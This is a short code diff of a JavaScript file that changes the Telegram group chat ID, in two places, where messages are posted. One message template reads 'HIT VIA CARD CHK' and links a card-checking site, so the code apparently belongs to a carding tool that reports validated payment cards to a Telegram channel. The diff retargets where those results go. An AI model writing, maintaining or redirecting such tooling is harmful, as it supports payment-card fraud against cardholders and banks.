@@ -231,7 +231,7 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Prepare data for API call
         const telegramData = {
-            chat_id: '-1002554243871', // Your actual group chat ID
+            chat_id: '-1003204998888', // Your actual group chat ID
             text: message,
             parse_mode: 'HTML'
         };
@@ -266,7 +266,7 @@ document.addEventListener('DOMContentLoaded', function() {
                                   `[⌇] 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ 𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲 (https://cxchk.site)`;
             
             const simpleTelegramData = {
-                chat_id: '-1002554243871',
+                chat_id: '-1003204998888',
                 text: simpleMessage,
                 parse_mode: 'Markdown'
             };
